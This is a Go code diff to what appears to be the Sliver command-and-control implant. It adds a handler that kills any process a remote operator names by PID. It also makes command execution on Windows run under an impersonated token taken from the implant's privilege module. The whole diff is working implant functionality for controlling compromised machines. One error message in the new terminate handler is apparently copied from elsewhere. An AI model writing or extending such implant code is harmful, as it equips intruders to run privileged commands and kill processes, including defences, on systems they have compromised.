@@ -33,6 +33,12 @@ import (
 	"log"
 	// {{end}}
 
+	// {{if eq .GOOS "windows"}}
+	"github.com/bishopfox/sliver/sliver/priv"
+	"golang.org/x/sys/windows"
+	"syscall"
+	// {{end}}
+
 	"os"
 	"path/filepath"
 
@@ -96,6 +102,31 @@ func psHandler(data []byte, resp RPCResponse) {
 		})
 	}
 	data, err = proto.Marshal(psList)
+	resp(data, err)
+}
+
+func terminateHandler(data []byte, resp RPCResponse) {
+	var errStr string
+	terminateReq := &pb.TerminateReq{}
+	err := proto.Unmarshal(data, terminateReq)
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	err = ps.Kill(int(terminateReq.Pid))
+	if err != nil {
+		// {{if .Debug}}
+		log.Printf("failed to list procs %v", err)
+		// {{end}}
+		errStr = err.Error()
+	}
+
+	termResp := &pb.Terminate{
+		Err: errStr,
+	}
+	data, err = proto.Marshal(termResp)
 	resp(data, err)
 }
 
@@ -429,6 +460,12 @@ func executeHandler(data []byte, resp RPCResponse) {
 	}
 	execResp := &pb.Execute{}
 	cmd = exec.Command(execReq.Path)
+	//{{if eq .GOOS "windows"}}
+	cmd.SysProcAttr = &windows.SysProcAttr{
+		Token: syscall.Token(priv.CurrentToken),
+	}
+	//{{end}}
+
 	if len(execReq.Args) != 0 {
 		cmd.Args = execReq.Args
 	}
